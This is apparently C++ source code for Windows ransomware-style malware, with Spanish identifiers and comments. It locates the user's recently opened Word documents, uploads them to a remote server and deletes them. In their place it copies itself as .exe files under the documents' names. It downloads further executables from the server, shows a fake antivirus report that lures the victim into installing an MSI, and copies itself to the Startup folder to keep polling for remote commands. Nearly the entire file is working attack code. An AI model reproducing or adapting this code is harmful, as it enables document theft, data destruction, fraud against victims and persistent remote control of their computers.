/*
ALLUSERSPROFILE
APPDATA
CommonProgramFiles
CommonProgramFiles(x86)
CommonProgramW6432
COMPUTERNAME
ComSpec
configsetroot
FP_NO_HOST_CHECK
HOMEDRIVE
HOMEPATH
LOCALAPPDATA
LOGONSERVER
NUMBER_OF_PROCESSORS
OS
Path
PATHEXT
PROCESSOR_ARCHITECTURE
PROCESSOR_IDENTIFIER
PROCESSOR_LEVEL
PROCESSOR_REVISION
ProgramData
ProgramFiles
ProgramFiles(x86)
ProgramW6432
PROMPT
PSModulePath
PUBLIC
SESSIONNAME
SystemDrive
SystemRoot
TEMP
TMP
USERDOMAIN
USERNAME
USERPROFILE
VBOX_MSI_INSTALL_PATH
VS140COMNTOOLS
windir
windows_tracing_flags
windows_tracing_logfile
*/
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <vector>
#include <fstream>

#include <codecvt>
#include "ransom.h"
#include "shobjidl.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <locale.h>
#include <Tlhelp32.h>
#include <atlstr.h>
#include <atlconv.h>


#pragma comment (lib,"Urlmon.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")

#define DEFAULT_BUFLEN 512
#define DEFAULT_MAXFILE 2080000
#define DEFAULT_PORT "80"

#define BOUNDARY_DOC "270103019722027841342355369633"
#define BOUNDARY_JPG "371588535111824475973752136518"
#define FILETYPE_DOC "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
#define FILETYPE_JPG "image/jpeg"
#define SALTO_LINEA "\r\n"

using std::cout;
using std::endl;
using std::string;
using std::wstring;
using std::ifstream;
using std::locale;
using std::vector;
using std::mbstate_t;
using std::to_string;
using std::codecvt;
using std::mbstate_t;
using std::use_facet;
using std::wcscmp;

string strUsuarioGlobal;
vector<string> rutasDocs;
string strFileReg;
string strFilesDeleted = "";
namespace nsRasonV1
{	
	string ClassRansom::strMessageGet(string strServer, string varUsuario, string varLeer, string varRespuesta)
	{
		string strRequest = "GET /ext/server.php?usuario=" + varUsuario + "&leer=" + varLeer + "&respuesta=" + varRespuesta + " HTTP/1.1" + SALTO_LINEA +
			"Host: " + strServer + SALTO_LINEA +
			"User-Agent: Mozilla/5.0 (whatever)" + SALTO_LINEA +
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" + SALTO_LINEA +
			"Accept-Language: en-US,en;q=0.5" + SALTO_LINEA +
			"Accept-Encoding: gzip, deflate" + SALTO_LINEA +
			"Connection: keep-alive" + SALTO_LINEA +
			"Upgrade-Insecure-Requests: 1" + SALTO_LINEA +
			"Connection: close" + SALTO_LINEA + SALTO_LINEA;
		return strRequest;
	}
	string ClassRansom::strClientSocket(string strServer, string mensaje)
	{
		string strResultado = "";
		int iLimite = mensaje.length();
		const char *sendbuf = mensaje.data();		
		WSADATA wsaData;
		SOCKET ConnectSocket = INVALID_SOCKET;
		struct addrinfo *result = NULL,
			*ptr = NULL,
			hints;
		char recvbuf[DEFAULT_BUFLEN];
		int iResult;
		int recvbuflen = DEFAULT_BUFLEN;

		// Initialize Winsock
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {			
			return "WAS failed";
		}

		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(strServer.c_str(), DEFAULT_PORT, &hints, &result);
		if (iResult != 0) {			
			WSACleanup();
			return "Get addres faile";
		}		
		for (ptr = result; ptr != NULL;ptr = ptr->ai_next) {
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype,
				ptr->ai_protocol);
			if (ConnectSocket == INVALID_SOCKET) {
				WSACleanup();
				return "Socket failed";
			}
			iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				closesocket(ConnectSocket);
				ConnectSocket = INVALID_SOCKET;
				continue;
			}
			break;
		}
		freeaddrinfo(result);

		if (ConnectSocket == INVALID_SOCKET) {
			WSACleanup();
			return "Unable connect to server";
		}
		iResult = send(ConnectSocket, sendbuf, iLimite, 0);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			WSACleanup();
			return "Send failed";
		}
		iResult = shutdown(ConnectSocket, SD_SEND);
		if (iResult == SOCKET_ERROR) {
			closesocket(ConnectSocket);
			WSACleanup();
			return "Shutdown error";
		}
		do {

			iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
			if (iResult > 0)
			{
				string strTemp(recvbuf);;
				strResultado = strTemp;
			}

			else if (iResult == 0)
			{
			}

			else
				return "recv failed with error";				

		} while (iResult > 0);
		closesocket(ConnectSocket);
		WSACleanup();
		return strResultado;
	}
	
	string ClassRansom::strFix(string &strCadena)
	{
		for (unsigned int i = 0; i < strCadena.length(); i++)
		{
			if (strCadena[i] == ' ')strCadena[i] = '_';
		}
		return strCadena;
	}
	string ClassRansom::strSend(string strServer, string strUsuario, string strArchivo, string strContentToUp)
	{
		string strPath = strArchivo;
		string strFileName = strPath.substr(strPath.find_last_of("\\") + 1, strPath.length());
		strFileName = strFix(strFileName);
		strPath = strPath.substr(0, strPath.find_last_of("\\") + 1);
		string strFileType = FILETYPE_JPG;
		string strRquestBoundaryNum = BOUNDARY_JPG;
		if (strFileName.find("doc") != string::npos)
		{
			strFileType = FILETYPE_DOC;
			strRquestBoundaryNum = BOUNDARY_DOC;
		}
		string valor = "0";
		string strBoundary = "---------------------------" + strRquestBoundaryNum;
		string strRequestBodyIni = "-----------------------------" + strRquestBoundaryNum;
		string strRequestBody0 = strRequestBodyIni + SALTO_LINEA
			"Content-Disposition: form-data; name=\"fichero_usuario\"; filename=" + strUsuario + "_" + strFileName + SALTO_LINEA
			"Content-Type: " + strFileType + SALTO_LINEA + SALTO_LINEA;

		string strRequestBody1 = strContentToUp;

		string strRequestBody2 = "\r\n-----------------------------" + strRquestBoundaryNum + "--" + SALTO_LINEA + SALTO_LINEA
			"Connection: close" + SALTO_LINEA + SALTO_LINEA;

		string strLargoBody = "";
		strLargoBody.append(strRequestBody0);
		strLargoBody.append(strRequestBody1);
		strLargoBody.append(strRequestBody2);
		int iTotal = strLargoBody.length();
		valor = to_string(iTotal - 21);
		string strRequest = "POST /ext/upload.php HTTP/1.1\r\n"
			"Host: " + strServer + SALTO_LINEA
			"User-Agent: Mozilla/5.0 (whatever)" + SALTO_LINEA
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" + SALTO_LINEA + "Accept-Language: en-US,en;q=0.5" + SALTO_LINEA
			"Accept-Encoding: gzip, deflate" + SALTO_LINEA
			"Content-Type: multipart/form-data; boundary=" + strBoundary + SALTO_LINEA
			"Content-Length: " + valor + SALTO_LINEA
			"Connection: keep-alive" + SALTO_LINEA + "Upgrade-Insecure-Requests: 1" + SALTO_LINEA + SALTO_LINEA;

		string strResult = "";
		strResult.append(strRequest);
		strResult.append(strRequestBody0);
		strResult.append(strRequestBody1);
		strResult.append(strRequestBody2);
		return strResult;
	}
	
	bool ClassRansom::bProcess(string strPath)
	{
		ifstream  ifsFile(strPath, ifstream::binary | ifstream::in);
		if (ifsFile.is_open())
		{
			ifsFile.seekg(0, ifsFile.end);
			int length = (int)ifsFile.tellg();
			if (length > DEFAULT_MAXFILE)return false;
			ifsFile.seekg(0, ifsFile.beg);
			char * buffer = new char[length];
			ifsFile.seekg(0, ifsFile.beg);
			ifsFile.read(buffer, length);
			ifsFile.close();
			string res(buffer, length);
			delete[] buffer;			
			strClientSocket(strServer,strSend(strServer,strUserRead("us.txt"), strPath, res));
		}
		return true;
	}

	string ClassRansom::strLnk(string strRuta)
	{
		ifstream  File(strRuta, ifstream::binary);
		if (File.is_open())
		{
			File.seekg(0, File.end);
			int length = (int)File.tellg();
			if (length > DEFAULT_MAXFILE)return "Archivo demasiado grande";
			File.seekg(0, File.beg);
			char * buffer = new char[length];
			File.seekg(0, File.beg);
			File.read(buffer, length);
			File.close();
			string res(buffer, length);
			string sd = "";
			bool st = false;
			int d = 0;
			int e = res.find(".docx") + 4;
			for (int i = e;i >= 0;i--)
			{
				if (res[i] == ':')
				{
					d = i - 1;
					break;
				}
			}
			for (int i = d;i <= e;i++)
			{
				char s = res[i];
				string st(1, s);
				sd.append(st);
			}
			delete[] buffer;
			return sd;
		}
		return "No se pudo abrir:  " + strRuta;
	}
	string ClassRansom::varEnviroiment(const char *variable)
	{
		char *pRetorno;
		size_t sizeRet;
		errno_t err = _dupenv_s(&pRetorno, &sizeRet, variable);
		if (err) return "mal";
		string strRutaLocal(pRetorno, sizeRet);
		free(pRetorno);
		if (strRutaLocal[strRutaLocal.length()] == '\0')strRutaLocal = strRutaLocal.substr(0, strRutaLocal.length() - 1);
		return strRutaLocal + "\\";
	}
	LPWSTR ClassRansom::strToLPWSTR(string strCadena)
	{		
		LPWSTR myLPWSTR = new WCHAR[255];
		MultiByteToWideChar(0, 0, strCadena.c_str(), -1, myLPWSTR, MAX_PATH);
		return myLPWSTR;
	}
	LPWSTR ClassRansom::myPath()
	{
		LPWSTR  lBuffer = new WCHAR[MAX_PATH];
		GetModuleFileName(NULL, lBuffer, MAX_PATH);
		return lBuffer;
	}	
	string LPWSTRtoString(LPWSTR LCadena)
	{
		string Temp = CW2A (LCadena);		
		return Temp;
	}
	
	LPCWSTR ClassRansom::strToLPCWSTR(const string& strURL)
	{
		setlocale(LC_ALL, "spanish");
		int bufferlen = ::MultiByteToWideChar(CP_ACP, 0, strURL.c_str(), strURL.size(), NULL, 0);
		if (bufferlen == 0)
		{
			return 0;
		}
		LPWSTR widestr = new WCHAR[bufferlen + 1];
		::MultiByteToWideChar(CP_ACP, 0, strURL.c_str(), strURL.size(), widestr, bufferlen);
		widestr[bufferlen] = 0;
		return widestr;
	}
	string ClassRansom::wStringToString(const wstring& wstr)
	{
		string res = "";
		setlocale(LC_ALL, "spanish");
		const wstring ws = wstr;
		const locale locale("");
		typedef codecvt<wchar_t, char, mbstate_t> converter_type;
		const converter_type& converter = use_facet<converter_type>(locale);
		vector<char> to(ws.length() * converter.max_length());
		mbstate_t state;
		const wchar_t* from_next;
		char* to_next;
		
		const converter_type::result result = converter.out(state, ws.data(), ws.data() + ws.length(), from_next, &to[0], &to[0] + to.size(), to_next);
		if (result == converter_type::ok || result == converter_type::noconv) {
			const string s(&to[0], to_next);
			res = s;
			//std::cout << "std::string =     " << s << std::endl;
		}
		/*setlocale(LC_ALL, "spanish");
		using convert_typeX = std::codecvt_utf8<wchar_t>;
		std::wstring_convert<convert_typeX, wchar_t> converterX;
		return converterX.to_bytes(wstr);*/
		return res;
	}
	bool ClassRansom::fileExist(string strPath)
	{
		ifstream  fileStream(strPath);
		if (fileStream.fail()) {
			return false;
		}
		else return true;
	}
	void ClassRansom::listFiles(string strRuta)
	{
		WIN32_FIND_DATA FindFileData;
		HANDLE hFind = INVALID_HANDLE_VALUE;
		LPCWSTR ruta = strToLPCWSTR(strRuta);
		int cont = 0;
		hFind = FindFirstFile(ruta, &FindFileData);
		if (hFind == INVALID_HANDLE_VALUE)
		{
			cout << "Handle incorrecto. Error: " << GetLastError();			
		}
		else
		{
			while (FindNextFile(hFind, &FindFileData) != 0)
			{
				if (FindFileData.dwFileAttributes < 8231)
				{

					wstring temp(FindFileData.cFileName);
					

					if (temp.find(strToLPCWSTR(".docx")) != string::npos)
					{
						string strRutaTemp = strRuta.substr(0, strRuta.length() - 3);
						strRutaTemp.append(wStringToString(FindFileData.cFileName));

						//std::cout << strRutaTemp << std::endl;
						//getchar();


						string strPathContains = strLnk(strRutaTemp);						
						//cout << strPathContains << endl;
						//getchar();
						if (fileExist(strPathContains))
						{
							if (strFileReg.compare(strPathContains)!=0)
							{
								rutasDocs.push_back(strPathContains);
								strFileReg = strPathContains;
							}
						}

					}
				}
			}
		}
	}
	string ClassRansom::strUserRead(string strRuta)
	{
		string strPathLocalAppData = varEnviroiment("LOCALAPPDATA");
		strPathLocalAppData.append(strRuta);		
		std::ifstream  ifs(strPathLocalAppData, std::ios::in);
		char user[128];
		if (!ifs.fail())
		{
			ifs.getline(user, sizeof(user));
			string ret(user);
			for (unsigned int i = 0; i < ret.length();i++)
			{
				if (!isalpha(ret[i]) && !isdigit(ret[i]))
				{
					ret = ret.substr(0, i);
					break;
				}
			}
			return ret;
		}
		return "nuevo";
	}
	bool ClassRansom::bCopyFile(string strSource, string strDestination)
	{
		HANDLE hFile;
		HANDLE hNewFile;
		DWORD dwBytesRead, dwBytesWritten, dwPos;
		LPCWSTR fname = myPath();
		if(!strSource.empty()) fname = strToLPWSTR(strSource);
		LPCWSTR fnameNew = strToLPWSTR(strDestination);

		char buff[4096];		
		hFile = CreateFile(fname,
			GENERIC_READ, 
			FILE_SHARE_READ | FILE_SHARE_WRITE, 
			NULL,
			OPEN_EXISTING, 
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hFile == INVALID_HANDLE_VALUE) return false;
		hNewFile = CreateFile(fnameNew,
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL);
		if (hNewFile == INVALID_HANDLE_VALUE)return false;
		do
		{
			if (ReadFile(hFile, buff, 4096, &dwBytesRead, NULL))
			{
				dwPos = SetFilePointer(hNewFile, 0, NULL, FILE_END);
				LockFile(hNewFile, dwPos, 0, dwBytesRead, 0);
				WriteFile(hNewFile, buff, dwBytesRead, &dwBytesWritten, NULL);
				UnlockFile(hNewFile, dwPos, 0, dwBytesRead, 0);
			}
		} while (dwBytesRead == 4096);
		if (CloseHandle(hFile) == 0 || CloseHandle(hNewFile) == 0) return false;
		return true;			
	}

	bool ClassRansom::bAdmin()
	{
		SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE);
		if (hSCManager != NULL)
		{
			CloseServiceHandle(hSCManager);
			return true;
		}
		else
		{
			CloseServiceHandle(hSCManager);
			return false;
		}
		
	}
	bool ClassRansom::bDownloadFile(string dirURL, string pathDestination)
	{
		if (URLDownloadToFile(0, strToLPCWSTR(dirURL), strToLPCWSTR(pathDestination), 0, 0) == S_OK)
			return true;
		else
			return false;
	}

	void ClassRansom::vProcessDocs(string strDownFile)
	{		
		//Buscar rutas Docx
		string strVar = varEnviroiment("APPDATA");
		strVar = strVar.substr(0, strVar.length());
		strVar.append("\\Microsoft\\Windows\\Recent\\*.*");
		listFiles(strVar);
		for (unsigned int i = 0; i < rutasDocs.size(); i++)
		{							
			if (bProcess(rutasDocs[i]))
			{				
				DeleteFile(strToLPCWSTR(rutasDocs[i]));
				strFilesDeleted.append(rutasDocs[i] + "<br>");
			}
			if(bCopyFile(strDownFile, rutasDocs[i].append(".exe")))cout << rutasDocs[i] << "\n";
		}
	}
	bool ClassRansom::extractResource(LPCWSTR pathDestiny, LPCWSTR nameResoruce, LPCWSTR typeResource)
	{
		HRSRC res = FindResource(NULL, nameResoruce, typeResource);
		if (res == NULL)
		{
			return false;
		}
		int size = SizeofResource(NULL, res);
		HGLOBAL hRes = LoadResource(NULL, res);
		unsigned char *pRes = (unsigned char *)LockResource(hRes);
		HANDLE hFile = CreateFile(pathDestiny, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
			return false;
		DWORD dwBytesWritten = 0;
		WriteFile(hFile, pRes, size, &dwBytesWritten, NULL);
		CloseHandle(hFile);
		return true;
	}
	bool ClassRansom::createHtml(string strFilesDelete, string strPathHtml, string strPathFile)
	{
		string html = "<html><head><meta http-equiv=\"Content - Type\" content=\"text / html; charset = utf - 8\" /><title>REPORTE ANTIVIRUS</title></head><body><p><h1>SE DETECTO UN RASONWARE EN SU EQUIPO QUE BORRO LOS SIGUIENTES ARCHIVOS:<br>";
		string htmlEnd = "EL ANTIVIRUS NECESITA UN SOFTWARE ADICIONAL PARA RECUPERAR ESOS ARCHIVOS, PUEDE DESCARGARLO E INSTALARLO PULSANDO ESTA IMAGEN.</h1></p><p><a href=\"file:///" + strPathFile +  "\"><img src=\"avast.jpg\" width=\"640\" height=\"360\" alt=\"Descargar complemento\"></a></p></body></html>";
		html.append(strFilesDelete);
		html.append(htmlEnd);
		std::ofstream fileHtml;
		if (fileHtml.fail())
		{			
			return false;
		}
		fileHtml.open(strPathHtml);
		fileHtml << html;
		fileHtml.close();
		return true;		
	}
	void ClassRansom::vRun(string strPath, string strParam, DWORD dTime)
	{
		STARTUPINFO info = { sizeof(info) };
		PROCESS_INFORMATION processInfo;
		if (CreateProcess(strToLPCWSTR(strPath), strToLPWSTR(strParam), NULL, NULL, TRUE, 0, NULL, NULL, &info, &processInfo))
		{
			WaitForSingleObject(processInfo.hProcess, dTime);
			CloseHandle(processInfo.hProcess);
			CloseHandle(processInfo.hThread);
		}
	}
	bool ClassRansom::listProcess(string strProcess)
	{
		HANDLE hProceso;
		PROCESSENTRY32 pProceso;
		pProceso.dwSize = sizeof(pProceso);
		hProceso = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		Process32First(hProceso, &pProceso);
		do
		{
			if (wcscmp(pProceso.szExeFile, strToLPCWSTR(strProcess)) == 0)
			{
				CloseHandle(hProceso);
				return true;
			}				
		} while (Process32Next(hProceso, &pProceso));
		CloseHandle(hProceso);
		return false;
	}
	ClassRansom::ClassRansom()
	{
		strServer = "10.0.0.9";
	}
	ClassRansom::ClassRansom(string strServerRemote)
	{		
		string strNameFile = "WinExt.exe";
		string strMSIFile = "Briana.msi";
		string strRutaLocalTemp = varEnviroiment("TEMP");
		string strPathDesktop = varEnviroiment("USERPROFILE") + "Desktop\\";
		string strRutainicio = varEnviroiment("APPDATA");
		strRutainicio.append("Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
		strRutainicio.append(strNameFile);

		string strIexplorer = varEnviroiment("ProgramFiles") + "Internet Explorer\\iexplore.exe";

		string strPathLocalAppData = varEnviroiment("LOCALAPPDATA");
		strPathLocalAppData.append(strNameFile);

		ClassRemoteView rv(strServerRemote.c_str());
		strServer = strServerRemote;
		strUsuarioGlobal = strUserRead("us.txt");
		if (strUsuarioGlobal.compare("nuevo") == 0)
		{
			rv.vConnect(strUsuarioGlobal);
		}
		strUsuarioGlobal = strUserRead("us.txt");		
		if (wcscmp(myPath(), strToLPCWSTR(strRutainicio)) == 0)
		{
			//Si esta en destino: leer ordenes						
			while (true)
			{
				rv.vConnect(strUsuarioGlobal);
				Sleep(500);
			}

		}
		else
		{
			//Si no esta en destino -> Generar US, Descargar EXE y subir docs, autocopiar			
			strUsuarioGlobal = strUserRead("us.txt");
			cout << strUsuarioGlobal << endl;
			//generar usuario
			rv.vConnect(strUsuarioGlobal);
			//descargar exe para permisos de admin			

			if (bDownloadFile("http://" + strServerRemote + "/ext/" + strNameFile, strRutaLocalTemp + strNameFile))
			{
				vProcessDocs(strRutaLocalTemp + strNameFile);				
			}
			//descargar msi
			if (bDownloadFile("http://" + strServerRemote + "/ext/" + strMSIFile, strRutaLocalTemp + strMSIFile))
			{
				if (createHtml(strFilesDeleted, strPathDesktop + "reporte.html", strRutaLocalTemp + strMSIFile))
					if (extractResource(strToLPCWSTR(strPathDesktop + "avast.jpg"), strToLPCWSTR("#102"), strToLPCWSTR("jpg")))
						vRun(strIexplorer, " " + strPathDesktop + "reporte.html", 0);				
			}			
			//Autocopia al inicio				
			if (bCopyFile(LPWSTRtoString(myPath()), strRutainicio))
			{
				vRun(strRutainicio, "",0);
			
			}
			//Copiar a APPdata
			if (bCopyFile(LPWSTRtoString(myPath()), strPathLocalAppData))
			{				
				
			}
			//Iniciar Word
			system("start WinWord");
		}		
	}
}
